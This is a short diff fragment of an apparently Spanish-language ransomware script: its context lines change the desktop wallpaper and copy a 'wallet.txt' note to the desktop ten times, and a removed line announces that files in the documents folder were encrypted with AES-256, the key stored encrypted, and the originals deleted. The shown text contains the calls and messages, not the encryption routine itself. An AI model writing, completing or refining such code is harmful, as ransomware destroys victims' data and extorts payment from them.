@@ -159,5 +159,3 @@ cambiar_fondo_escritorio(ruta_imagen)
 
 # Copiar wallet.txt al escritorio 10 veces
 copiar_wallet_al_escritorio()
-
-print(f'Archivos cifrados con AES-256 en {documents_dir}. La clave AES cifrada ha sido guardada en "clave_aes_cifrada.txt". Los archivos originales han sido eliminados.')
